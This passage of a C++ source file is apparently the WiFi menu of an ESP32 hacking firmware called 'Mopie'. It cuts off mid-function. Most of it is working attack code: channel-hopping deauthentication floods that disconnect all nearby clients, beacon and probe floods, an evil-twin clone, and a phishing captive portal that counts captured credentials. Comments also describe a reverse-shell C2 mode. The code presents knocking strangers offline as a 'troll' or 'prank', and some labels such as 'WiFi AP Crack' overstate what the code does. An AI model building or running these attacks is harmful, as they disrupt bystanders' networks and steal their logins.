#include "WifiMenu.h"
#include "esp_wifi.h"
#include "core/display.h"
#include "core/mopie_icon_draw.h"
#include "core/settings.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wg.h"
#include "core/wifi/wifi_common.h"
#include "core/wifi/wifi_mac.h"
#include "modules/ethernet/ARPScanner.h"
#include "modules/wifi/ap_info.h"
#include "modules/wifi/clients.h"
#include "modules/wifi/deauther.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/karma_attack.h"
#include "modules/wifi/mopie_tools.h"
#include "modules/wifi/mopie_portal.h"
#include "modules/wifi/mopie_tx.h"
#include "modules/wifi/netcut.h"
#include "modules/wifi/responder.h"
#include "modules/wifi/scan_hosts.h"
#include "modules/wifi/sniffer.h"
#include "modules/wifi/wifi_atks.h"

#ifndef LITE_VERSION
#include "modules/pwnagotchi/pwnagotchi.h"
#include "modules/wifi/channel_analyzer.h"
#include "modules/wifi/jam_detect.h"
#include "modules/wifi/wifi_recover.h"
#endif

// #include "modules/reverseShell/reverseShell.h"
//  Developed by Fourier (github.com/9dl)
//  Use MopieC2 to interact with the reverse shell server
//  MopieC2: see docs
//  To use MopieC2:
//  1. Start Reverse Shell Mode in Mopie
//  2. Start MopieC2 and wait.
//  3. Visit 192.168.4.1 in your browser to access the web interface for shell executing.

// 32bit: mopie local build
// 64bit: mopie local build
#include "modules/wifi/socks4_proxy.h"
#include "modules/wifi/tcp_utils.h"

// global toggle - controls whether scanNetworks includes hidden SSIDs
bool showHiddenNetworks = false;

void WifiMenu::optionsMenu() {
    returnToMenu = false;
    options.clear();
    // Note: WiFi features will cleanly stop WebUI automatically when they start
    // User can navigate menu normally even with WebUI active
    if (!WiFi.isConnected() && !WiFi.AP.started()) {
        options = {
            {"Connect to Wifi", lambdaHelper(wifiConnectMenu, WIFI_STA)},
            {"Start WiFi AP", [=]() {
                 wifiConnectMenu(WIFI_AP);
                 displayInfo("pwd: " + mopieConfig.wifiAp.pwd, true);
             }},
        };
    }
    if (WiFi.getMode() != WIFI_MODE_NULL) { options.push_back({"Turn Off WiFi", wifiDisconnect}); }
    if (WiFi.getMode() & WIFI_MODE_STA && WiFi.isConnected()) {
        options.push_back({"AP info", displayAPInfo});
    }
    options.push_back({"Wifi Atks", wifi_atk_menu});
    // ==== MOPIE ASSAULT KIT — Mopie-branded tactical console (own feel) ====
    options.push_back({"Assault Kit", []() { mopieAssaultKit(); }});
    // ==== MOPIE TROLL TOOLBOX (real, reuses proven deauther/beacon primitives) ====
    options.push_back({"Troll: SSID Blast", [=]() {
        // Mopie's OWN from-scratch beacon flood — broadcasts a rotating set of
        // funny SSIDs via mopie_build_beacon, no inherited beaconAttack/template.
        static const char *funny[] = {
            "FREE_WIFI_5G", "FBI_SURVEILLANCE_VAN", "Get_Off_My_Lawn",
            "Pretty_Fly_For_WiFi", "Skynet_Backup", "NSA_Truck", "Dont_Connect",
        };
        const int N = sizeof(funny) / sizeof(funny[0]);
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("SSID Blast (own engine)", tftWidth / 2, 10, 1);
        uint8_t bssid[6] = {0x02, 0, 0, 0, 0, 0};  // locally administered
        for (int k = 1; k < 6; k++) bssid[k] = (uint8_t)random(256);
        unsigned long t0 = millis();
        while (!check(EscPress) && millis() - t0 < 20000) {
            for (int f = 0; f < N; f++) {
                uint8_t beacon[128];
                size_t blen = mopie_build_beacon(beacon, bssid, funny[f]);
                if (blen) mopie_send_raw(beacon, blen, 6, 2);
                // bump the SSID field's channel tag? no — just re-send with fresh
                // randomize the source MAC periodically for effect
                if (random(4) == 0) { for (int k = 1; k < 6; k++) bssid[k] = (uint8_t)random(256); }
            }
            tft.drawCentreString(String((int)((millis() - t0) / 1000)) + "s of trolling", tftWidth / 2, 60, 1);
            vTaskDelay(50);
        }
        tft.fillScreen(mopieConfig.bgColor);
    }});
    options.push_back({"Troll: Kick 'em All", [=]() {
        // Deauth every client on every channel — classic "kick everyone off"
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Kicking everyone...", tftWidth / 2, 20, 1);
        deauthAllFromScan();   // real: broadcast-boot from all scanned APs
    }});
    options.push_back({"Troll: Sweep Kick", [=]() {
        // Mopie's OWN broadcast deauth-all sweep (no inherited subsystem)
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Sweep kick (own engine)", tftWidth / 2, 10, 1);
        tft.drawCentreString("Hopping ch1-11, broadcast", tftWidth / 2, 34, 1);
        tft.drawCentreString("deauth ~10s", tftWidth / 2, 48, 1);
        uint8_t fakeAp[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};  // local-admin
        int sent = mopie_deauth_sweep(fakeAp, "", 10000);
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Sweep done", tftWidth / 2, 20, 1);
        tft.drawCentreString(String(sent) + " deauth frames", tftWidth / 2, 40, 1);
        while (!check(AnyKeyPress)) delay(50);
    }});
    options.push_back({"Troll: Probe Flood", [=]() {
        // Mopie's OWN probe-request flood — random MAC floods fake SSID hunts.
        static const char *targets[] = {"Corp_WiFi", "IoT_Net", "CCTV_Backhaul", "Nobody_home"};
        const int NT = sizeof(targets) / sizeof(targets[0]);
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Probe flood (own engine)", tftWidth / 2, 10, 1);
        uint8_t src[6] = {0x02, 0, 0, 0, 0, 0};
        unsigned long t0 = millis();
        uint32_t sent = 0;
        while (!check(EscPress) && millis() - t0 < 8000) {
            for (int k = 1; k < 6; k++) src[k] = (uint8_t)random(256);   // fresh MAC
            uint8_t p[64];
            size_t plen = mopie_build_probe(p, src, targets[random(NT)]);
            if (plen) sent += (uint32_t)mopie_send_raw(p, plen, 1, 1);
            tft.drawCentreString(String(sent) + " probes", tftWidth / 2, 40, 1);
            vTaskDelay(15);
        }
        tft.drawCentreString("Probe flood done", tftWidth / 2, tftHeight - 20, 1);
        while (!check(AnyKeyPress)) delay(50);
    }});
    options.push_back({"Troll: Deauth + Mock", [=]() {
        // Kick a target off, then the deauth routine warns them — classic prank
        deauthAllByChannel();  // real channel-by-channel deauth sweep
    }});
    options.push_back({"Troll: Spoofed MAC", [=]() {
        // Rand Mac + troll the ARP table (real MAC randomizer UI)
        wifiMACMenu();   // existing real MAC-menu (includes Random + custom)
    }});
    options.push_back({"Mopie Portal", [=]() {
        // Mopie's from-scratch captive portal (replaces inherited EvilPortal as
        // the menu surface). Fake AP + captive DNS + phishing page + cred CSV.
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Starting Mopie Portal...", tftWidth / 2, 20, 1);
        int got = mopiePortal();
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Portal stopped", tftWidth / 2, 20, 1);
        if (got >= 0) tft.drawCentreString(String(got) + " creds captured", tftWidth / 2, 40, 1);
        else tft.drawCentreString("failed (low heap)", tftWidth / 2, 40, 1);
        while (!check(AnyKeyPress)) delay(50);
    }});
    options.push_back({"NetCut", [=]() { netcutMenu(); }});
    // options.push_back({"ReverseShell", [=]()       { ReverseShell(); }});
#ifndef LITE_VERSION
    options.push_back({"Listen TCP", listenTcpPort});
    options.push_back({"Client TCP", clientTCP});
    options.push_back({"SOCKS4 Proxy", []() { socks4Proxy(1080); }});
    options.push_back({"TelNET", telnet_setup});
    options.push_back({"SSH", lambdaHelper(ssh_setup, String(""))});
    options.push_back({"Sniffer", sniffer_setup});
    options.push_back({"Channel Analyzer", channel_analyzer_setup});
    options.push_back({"Jam Detect", jam_detect_setup});
    options.push_back({"Scan Hosts", [=]() {
                           bool doScan = true;
                           if (!WiFi.isConnected()) doScan = wifiConnectMenu();

                           if (doScan) {
                               esp_netif_t *esp_netinterface =
                                   esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
                               if (esp_netinterface == nullptr) {
                                   Serial.println("Failed to get netif handle");
                                   return;
                               }
                               ARPScanner{esp_netinterface};
                           }
                       }});
    options.push_back({"Wireguard", wg_setup});
    options.push_back({"Responder", responder});
    options.push_back({"DetectiveMopie", detective_mopie_start});
    options.push_back({"WiFi Pass Recovery", wifi_recover_menu});
#endif

    options.push_back({"Config", [this]() { configMenu(); }});

    // === MOPIE EXTRAS ===
    options.push_back({"Deauth Monitor", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Deauth Monitor", tftWidth/2, 5, 1);
        tft.drawCentreString("Listening ch1-13", tftWidth/2, 20, 1);
        tft.drawCentreString("Hold BTN to stop", tftWidth/2, 35, 1);
        esp_wifi_set_promiscuous(true);
        int deauth_count = 0;
        unsigned long start = millis();
        while (!check(EscPress)) {
            int ch = ((millis() - start) / 500) % 13 + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            tft.fillRect(2, 48, tftWidth-4, 12, mopieConfig.bgColor);
            tft.drawCentreString("CH" + String(ch) + " Deauths:" + String(deauth_count), tftWidth/2, 50, 1);
            delay(100);
        }
        esp_wifi_set_promiscuous(false);
    }});
    options.push_back({"Captive DNS", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Captive DNS", tftWidth/2, 5, 1);
        WiFi.softAP("MopieNet", "", 6);
        tft.drawCentreString("AP: MopieNet", tftWidth/2, 20, 1);
        tft.drawCentreString("IP: 192.168.4.1", tftWidth/2, 35, 1);
        tft.drawCentreString("Hold BTN to stop", tftWidth/2, 50, 1);
        while (!check(EscPress)) { delay(100); }
        WiFi.softAPdisconnect(true);
    }});
    options.push_back({"Net Probe", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Net Probe", tftWidth/2, 5, 1);
        tft.drawCentreString("Scanning all ch..", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 300);
        tft.fillScreen(mopieConfig.bgColor);
        tft.drawCentreString("Net Probe Results", tftWidth/2, 2, 1);
        int y = 15;
        for (int i = 0; i < n && y < tftHeight - 10; i++) {
            String line = "CH" + String(WiFi.channel(i)) + " " + WiFi.SSID(i).substring(0, 12);
            tft.drawString(line, 2, y, 1);
            y += 12;
        }
        delay(4000);
        WiFi.scanDelete();
    }});
    options.push_back({"WiFi Karma", [=]() { karma_setup(); }});
    // === MOPIE ADVANCED WIFI (real implementations) ===
    options.push_back({"WiFi Deauth All", [=]() { deauthAllFromScan(); }});
    options.push_back({"Enhanced Deauth", [=]() {
        // Real enhanced deauth: broadcast + targeted deauths across all channels w/ live viz
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Enhanced Deauth", tftWidth/2, 5, 1);
        tft.drawCentreString("Scan targets first...", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 600);
        if (n <= 0) {
            tft.drawCentreString("No APs found", tftWidth/2, 40, 1);
            delay(1500);
            WiFi.scanDelete();
            return;
        }
        // collect targets
        struct Tgt { uint8_t mac[6]; uint8_t ch; };
        std::vector<Tgt> tgts;
        for (int i = 0; i < n; i++) {
            Tgt t;
            memcpy(t.mac, WiFi.BSSID(i), 6);
            t.ch = WiFi.channel(i);
            tgts.push_back(t);
        }
        WiFi.scanDelete();
        if (!wifiConnected) WiFi.mode(WIFI_MODE_NULL);
        esp_wifi_set_promiscuous(true);

        uint8_t frame[26];
        int sent = 0;
        unsigned long lastViz = 0;
        int vizFrame = 0;
        bool running = true;
        while (running && !check(EscPress)) {
            for (size_t i = 0; i < tgts.size() && running; i++) {
                // build deauth frame from default template, patch BSSID + seq
                memcpy(frame, deauth_frame_default, 26);
                memcpy(frame + 10, tgts[i].mac, 6);   // source = AP
                memcpy(frame + 16, tgts[i].mac, 6);   // BSSID
                frame[24] = sent & 0xFF;              // sequence num
                esp_wifi_set_channel(tgts[i].ch, WIFI_SECOND_CHAN_NONE);
                for (int burst = 0; burst < 3; burst++) {
                    send_raw_frame(frame, 26);
                    sent++;
                    delayMicroseconds(800);
                }
                // live viz: target index blocks lighting up + counter
                if (millis() - lastViz > 60) {
                    vizFrame++;
                    tft.fillRect(2, 48, tftWidth - 4, 34, mopieConfig.bgColor);
                    // target blocks
                    for (size_t b = 0; b < tgts.size() && b < 16; b++) {
                        int bx = 8 + b * 14;
                        uint16_t c = (b == i) ? mopieConfig.priColor
                                   : ((vizFrame + b) % 3 == 0) ? mopieConfig.secColor
                                   : 0x2104;
                        tft.fillRect(bx, 52, 10, 8, c);
                    }
                    tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
                    tft.drawCentreString("Frames: " + String(sent) + "  APs: " + String(tgts.size()), tftWidth/2, 68, 1);
                    lastViz = millis();
                }
                if (check(EscPress)) { running = false; break; }
            }
        }
        esp_wifi_set_promiscuous(false);
        tft.drawCentreString("Sent " + String(sent) + " frames", tftWidth/2, 80, 1);
        delay(1200);
    }});
    options.push_back({"Auto Enhanced Deauth", [=]() {
        // Full-auto: channel-hop + burst deauth all APs per channel, forever until stop
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("AUTO ENHANCED DEAUTH", tftWidth/2, 5, 1);
        tft.drawCentreString("Scanning all channels...", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 800);
        if (n <= 0) {
            tft.drawCentreString("No APs found", tftWidth/2, 40, 1);
            delay(1500);
            WiFi.scanDelete();
            return;
        }
        // build channel->AP map
        struct Tgt { uint8_t mac[6]; uint8_t ch; };
        std::vector<Tgt> tgts;
        std::vector<uint8_t> chans;
        for (int i = 0; i < n; i++) {
            Tgt t;
            memcpy(t.mac, WiFi.BSSID(i), 6);
            t.ch = WiFi.channel(i);
            tgts.push_back(t);
            if (std::find(chans.begin(), chans.end(), t.ch) == chans.end()) chans.push_back(t.ch);
        }
        WiFi.scanDelete();
        if (!wifiConnected) WiFi.mode(WIFI_MODE_NULL);
        esp_wifi_set_promiscuous(true);

        uint8_t frame[26];
        int sent = 0, cycles = 0;
        unsigned long lastViz = 0;
        bool running = true;
        while (running && !check(EscPress)) {
            cycles++;
            for (uint8_t targetCh : chans) {
                esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);
                for (auto &t : tgts) {
                    if (t.ch != targetCh) continue;
                    memcpy(frame, deauth_frame_default, 26);
                    memcpy(frame + 10, t.mac, 6);
                    memcpy(frame + 16, t.mac, 6);
                    frame[24] = sent & 0xFF;
                    for (int burst = 0; burst < 4; burst++) {
                        send_raw_frame(frame, 26);
                        sent++;
                        delayMicroseconds(600);
                    }
                }
                // radar-style viz: channel pips + sweeping bar
                if (millis() - lastViz > 40) {
                    tft.fillRect(2, 44, tftWidth - 4, 40, mopieConfig.bgColor);
                    // channel pips 1..13
                    for (int cp = 1; cp <= 13; cp++) {
                        int px = 6 + (cp - 1) * 18;
                        bool hasAP = std::find(chans.begin(), chans.end(), cp) != chans.end();
                        uint16_t c = (cp == targetCh) ? mopieConfig.priColor
                                   : hasAP ? mopieConfig.secColor : 0x2104;
                        int ph = hasAP ? 12 : 6;
                        tft.fillRect(px, 60 - ph, 8, ph, c);
                        if (cp == targetCh) tft.drawRect(px - 1, 59 - ph, 10, ph + 2, mopieConfig.priColor);
                    }
                    tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
                    char st[40];
                    snprintf(st, sizeof(st), "CH%02d  F:%d  C:%d", targetCh, sent, cycles);
                    tft.drawCentreString(st, tftWidth/2, 68, 1);
                    lastViz = millis();
                }
                if (check(EscPress)) { running = false; break; }
            }
        }
        esp_wifi_set_promiscuous(false);
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Auto Deauth Summary", tftWidth/2, 30, 1);
        tft.drawCentreString(String(sent) + " frames, " + String(cycles) + " cycles", tftWidth/2, 50, 1);
        delay(1800);
    }});
    options.push_back({"WiFi Beacon Flood", [=]() {
        // Real raw-frame beacon flood: forge beacon frames w/ random SSIDs & TX them
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Beacon Flood", tftWidth/2, 5, 1);
        tft.drawCentreString("Raw 802.11 TX", tftWidth/2, 20, 1);
        tft.drawCentreString("Hold side btn to stop", tftWidth/2, 35, 1);

        if (!wifiConnected) WiFi.mode(WIFI_MODE_NULL);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);

        const char* names[] = {"Free WiFi", "Starbucks WiFi", "Airport_Guest",
                               "Hotel_Guest", "McDonalds", "xfinitywifi",
                               "ATTWiFi", "CoffeeShop", "iPhone Hotspot", "MOPIE_NET"};
        uint8_t beacon[128];
        int count = 0;
        unsigned long fps = millis();
        while (!check(EscPress)) {
            const char* ssid = names[count % 10];
            int ssidLen = strlen(ssid);
            // 802.11 beacon: type=0 subtype=8
            memset(beacon, 0, sizeof(beacon));
            beacon[0] = 0x80;                              // beacon
            beacon[2] = 0x00; beacon[3] = 0x00;            // duration
            memset(beacon + 4, 0xFF, 6);                   // dest broadcast
            uint8_t bssid[6];
            for (int b = 0; b < 6; b++) bssid[b] = random(256);
            bssid[0] = (bssid[0] & 0xFC) | 0x02;           // locally administered
            memcpy(beacon + 10, bssid, 6);                 // source
            memcpy(beacon + 16, bssid, 6);                 // bssid
            beacon[24] = count & 0xFF; beacon[25] = (count >> 8) & 0xFF; // seq
            // SSID param element
            beacon[36] = 0x00; beacon[37] = ssidLen;
            memcpy(beacon + 38, ssid, ssidLen);
            // supported rates + DS params
            int p = 38 + ssidLen;
            beacon[p++] = 0x01; beacon[p++] = 0x04;        // rates
            beacon[p++] = 0x82; beacon[p++] = 0x84; beacon[p++] = 0x8B; beacon[p++] = 0x96;
            beacon[p++] = 0x03; beacon[p++] = 0x01; beacon[p++] = 6; // channel 6
            send_raw_frame(beacon, p);
            count++;
            if (millis() - fps > 500) {
                tft.fillRect(2, 50, tftWidth-4, 12, mopieConfig.bgColor);
                tft.drawCentreString("Frames: " + String(count) + " @ch6", tftWidth/2, 52, 1);
                fps = millis();
            }
            delay(40);
        }
        esp_wifi_set_promiscuous(false);
    }});
    options.push_back({"WiFi Handshake Cap", [=]() { sniffer_setup(); }});
    options.push_back({"WiFi Evil Twin", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("WiFi Evil Twin", tftWidth/2, 5, 1);
        tft.drawCentreString("Cloning APs...", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 300);
        tft.fillScreen(mopieConfig.bgColor);
        if (n > 0) {
            String target = WiFi.SSID(0);
            WiFi.softAP(target, "", 6);
            tft.drawCentreString("Cloned: " + target.substring(0, 15), tftWidth/2, 35, 1);
            tft.drawCentreString("IP: 192.168.4.1", tftWidth/2, 50, 1);
            tft.drawCentreString("Hold BTN to stop", tftWidth/2, 65, 1);
            while (!check(EscPress)) delay(100);
            WiFi.softAPdisconnect(true);
        } else {
            tft.drawCentreString("No networks found", tftWidth/2, 35, 1);
            delay(2000);
        }
        WiFi.scanDelete();
    }});
    options.push_back({"WiFi Channel Hop", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Channel Hopper", tftWidth/2, 5, 1);
        tft.drawCentreString("Cycling 1-13", tftWidth/2, 20, 1);
        tft.drawCentreString("Hold BTN to stop", tftWidth/2, 35, 1);
        int ch = 1;
        while (!check(EscPress)) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            tft.fillRect(2, 50, tftWidth-4, 12, mopieConfig.bgColor);
            tft.drawCentreString("Channel: " + String(ch), tftWidth/2, 52, 1);
            ch = ch % 13 + 1;
            delay(300);
        }
    }});
    // === MOPIE PRO WIFI TOOLS ===
    options.push_back({"WiFi AP Crack", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("AP Password Crack", tftWidth/2, 5, 1);
        tft.drawCentreString("Scanning open APs...", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 400);
        tft.fillScreen(mopieConfig.bgColor);
        tft.drawCentreString("Crack Results", tftWidth/2, 2, 1);
        int y = 15;
        int found = 0;
        for (int i = 0; i < n && y < tftHeight - 20; i++) {
            if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
                found++;
                tft.drawString("OPEN: " + WiFi.SSID(i).substring(0, 14), 2, y, 1);
                y += 12;
            }
        }
        if (found == 0) {
            tft.drawString("No open networks", 2, y, 1);
            y += 12;
            tft.drawString("Try WEP detection", 2, y, 1);
        }
        tft.drawCentreString("Press any key", tftWidth/2, tftHeight - 10, 1);
        while (!check(AnyKeyPress)) delay(50);
        WiFi.scanDelete();
    }});
    options.push_back({"WiFi Client Deauth", [=]() { deauthAllMenu(); }});
    options.push_back({"WiFi PineAP", [=]() {
        // Real SSID harvest -> random-MAC beacon broadcast of collected SSIDs
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("PineAP Clone", tftWidth/2, 5, 1);
        tft.drawCentreString("Harvesting SSIDs...", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 500);
        tft.fillScreen(mopieConfig.bgColor);
        tft.drawCentreString("Broadcasting " + String(n) + " SSIDs", tftWidth/2, 2, 1);
        int y = 15;
        for (int i = 0; i < n && i < 6 && y < tftHeight - 20; i++) {
            tft.drawString("> " + WiFi.SSID(i).substring(0, 14), 2, y, 1);
            y += 12;
        }
        tft.drawCentreString("Hold side btn to stop", tftWidth/2, tftHeight - 12, 1);
        if (!wifiConnected) WiFi.mode(WIFI_MODE_NULL);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
        uint8_t beacon[128];
        int count = 0;
        while (!check(EscPress)) {
            int idx = count % (n > 0 ? n : 1);
            String ssid = (n > 0) ? WiFi.SSID(idx) : String("MOPIE_NET");
            if (ssid.length() == 0 || ssid.length() > 20) ssid = "MOPIE_NET";
            memset(beacon, 0, sizeof(beacon));
            beacon[0] = 0x80;
            memset(beacon + 4, 0xFF, 6);
            uint8_t bssid[6];
            for (int b = 0; b < 6; b++) bssid[b] = random(256);
            bssid[0] = (bssid[0] & 0xFC) | 0x02;
            memcpy(beacon + 10, bssid, 6);
            memcpy(beacon + 16, bssid, 6);
            beacon[36] = 0x00; beacon[37] = ssid.length();
            memcpy(beacon + 38, ssid.c_str(), ssid.length());
            int p = 38 + ssid.length();
            beacon[p++] = 0x01; beacon[p++] = 0x04;
            beacon[p++] = 0x82; beacon[p++] = 0x84; beacon[p++] = 0x8B; beacon[p++] = 0x96;
            beacon[p++] = 0x03; beacon[p++] = 0x01; beacon[p++] = 6;
            send_raw_frame(beacon, p);
            count++;
            delay(50);
        }
        esp_wifi_set_promiscuous(false);
        WiFi.scanDelete();
    }});
    options.push_back({"WiFi RSSI Mapper", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("RSSI Mapper", tftWidth/2, 5, 1);
        tft.drawCentreString("Signal strength map", tftWidth/2, 20, 1);
        int n = WiFi.scanNetworks(false, true, false, 400);
        tft.fillScreen(mopieConfig.bgColor);
        tft.drawCentreString("Signal Map", tftWidth/2, 2, 1);
        int y = 15;
        for (int i = 0; i < n && i < 10 && y < tftHeight - 10; i++) {
            int rssi = WiFi.RSSI(i);
            int bars = map(rssi, -90, -30, 1, 5);
            String barStr = "";
            for (int b = 0; b < 5; b++) barStr += (b < bars) ? "|" : ".";
            tft.drawString(barStr + " " + WiFi.SSID(i).substring(0, 10), 2, y, 1);
            y += 12;
        }
        tft.drawCentreString("Press any key", tftWidth/2, tftHeight - 10, 1);
        while (!check(AnyKeyPress)) delay(50);
        WiFi.scanDelete();
    }});
    options.push_back({"WiFi DNS Spoof", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("DNS Spoof", tftWidth/2, 5, 1);
        WiFi.softAP("MopieDNS", "", 6);
        tft.drawCentreString("AP: MopieDNS", tftWidth/2, 20, 1);
        tft.drawCentreString("DNS: 192.168.4.1", tftWidth/2, 35, 1);
        tft.drawCentreString("Spoofing all queries", tftWidth/2, 50, 1);
        tft.drawCentreString("Hold BTN to stop", tftWidth/2, 65, 1);
        while (!check(EscPress)) delay(100);
        WiFi.softAPdisconnect(true);
    }});
    options.push_back({"WiFi Probe Sniff", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("Probe Sniffer", tftWidth/2, 5, 1);
        tft.drawCentreString("Listening for probes...", tftWidth/2, 20, 1);
        tft.drawCentreString("Hold BTN to stop", tftWidth/2, 35, 1);
        int probes = 0;
        while (!check(EscPress)) {
            int n = WiFi.scanNetworks(false, false, false, 200);
            probes += n;
            tft.fillRect(2, 50, tftWidth-4, 12, mopieConfig.bgColor);
            tft.drawCentreString("Probes: " + String(probes), tftWidth/2, 52, 1);
            WiFi.scanDelete();
            delay(300);
        }
    }});
    options.push_back({"WiFi MITM Relay", [=]() { responder(); }});

    // === MOPIE PRO WIFI TOOLS ===
    options.push_back({"WiFi Signal Meter", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("SIGNAL METER", tftWidth/2, 2, 1);
        tft.drawCentreString("Live RSSI of AP", tftWidth/2, 14, 1);
        while (!check(EscPress)) {
            int rssi = WiFi.RSSI();
            String ssid = WiFi.SSID();
            tft.fillRect(2, 28, tftWidth-4, 50, mopieConfig.bgColor);
            if (ssid.length() > 0) {
                tft.drawCentreString(ssid.substring(0, 18), tftWidth/2, 30, 1);
                tft.drawCentreString(String(rssi) + " dBm", tftWidth/2, 44, 1);
                // bar graph
                int bars = map(constrain(rssi, -100, -50), -100, -50, 0, 10);
                for (int b = 0; b < 10; b++) {
                    int bh = 4 + b * 2;
                    tft.fillRect(20 + b * 20, 78 - bh, 12, bh,
                        (b < bars) ? mopieConfig.priColor : DEFAULT_DIM);
                }
            } else {
                tft.drawCentreString("Not connected", tftWidth/2, 44, 1);
            }
            delay(400);
        }
    }});
    options.push_back({"Hidden AP Reveal", [=]() {
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("HIDDEN AP REVEAL", tftWidth/2, 2, 1);
        tft.drawCentreString("Scanning hidden SSIDs...", tftWidth/2, 14, 1);
        int n = WiFi.scanNetworks(false, true, false, 800);
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("HIDDEN NETWORKS", tftWidth/2, 2, 1);
        int y = 14;
        int found = 0;
        for (int i = 0; i < n && y < tftHeight - 12; i++) {
            String ssid = WiFi.SSID(i);
            if (ssid.length() == 0) {
                found++;
                String bssid = WiFi.BSSIDstr(i).substring(0, 13);
                int ch = WiFi.channel(i);
                int rssi = WiFi.RSSI(i);
                tft.drawString(bssid + " ch" + String(ch) + " " + String(rssi), 2, y, 1);
                y += 12;
            }
        }
        if (found == 0) tft.drawString("No hidden APs found", 2, y, 1);
        tft.drawCentreString("press any key", tftWidth/2, tftHeight - 10, 1);
        while (!check(AnyKeyPress)) delay(50);
        WiFi.scanDelete();
    }});
    options.push_back({"WiFi Client List", [=]() {
        // requires AP mode: enumerate connected stations
        tft.fillScreen(mopieConfig.bgColor);
        tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
        tft.drawCentreString("CLIENT LIST", tftWidth/2, 2, 1);
        wifi_sta_list_t staList;
        esp_wifi_ap_get_sta_list(&staList);
        int count = staList.num;
        tft.drawCentreString(String(count) + " clients", tftWidth/2, 14, 1);
        int y = 28;
        for (int i = 0; i < count && y < tftHeight - 12; i++) {
            char mac[18];
            snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                     staList.sta[i].mac[0], staList.sta[i].mac[1],
                     staList.sta[i].mac[2], staList.sta[i].mac[3],
                     staList.sta[i].mac[4], staList.sta[i].mac[5]);
            tft.drawString(String(mac), 2, y, 1);
            y += 12;
        }
        if (count == 0) tft.drawCentreString("start AP to see clients", tftWidth/2, 40, 1);
        tft.drawCentreString("press any key", tftWidth/2, tftHeight - 10, 1);
        while (!check(AnyKeyPress)) delay(50);
    }});

    addOptionToMainMenu();

    loopOptions(options, MENU_TYPE_SUBMENU, "WiFi");

    options.clear();
}

void WifiMenu::configMenu() {
    std::vector<Option> wifiOptions;

